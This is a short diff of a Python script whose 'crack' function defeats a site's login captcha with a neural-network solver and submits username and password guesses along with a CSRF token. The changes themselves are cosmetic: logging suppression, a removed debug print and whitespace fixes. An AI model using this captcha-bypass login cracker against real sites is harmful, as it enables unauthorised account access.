@@ -4,6 +4,8 @@ import requests
 from bs4 import BeautifulSoup
 from tqdm import tqdm
 
+os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'
+
 try:
     from app.util.captcha_break import predict_image
 except Exception:
@@ -11,7 +13,6 @@ except Exception:
 
     _file_abspath = os.path.abspath(__file__)
     sys.path.append(os.path.dirname(os.path.dirname(_file_abspath)))
-    print(sys.path)
     from app.util.captcha_break import predict_image
 
 
@@ -24,7 +25,7 @@ def check_successfully(content):
 
 
 def get_captcha(image_name):
-    code = predict_image(image_name, model_path="../model/cnn.h5")
+    code = predict_image(image_name)
     return code
 
 
@@ -43,8 +44,8 @@ def crack(site, username, password):
     captcha_code = get_captcha(image_name)
     os.remove(image_name)
 
-    response = s.post(site + 'login', data={'csrf_token': csrf, 
-                                            'username': username, 
+    response = s.post(site + 'login', data={'csrf_token': csrf,
+                                            'username': username,
                                             'password': password, 'captcha_code': captcha_code, 'submit': 'Login'})
     if check_successfully(response.content.decode()):
         return True, username, password
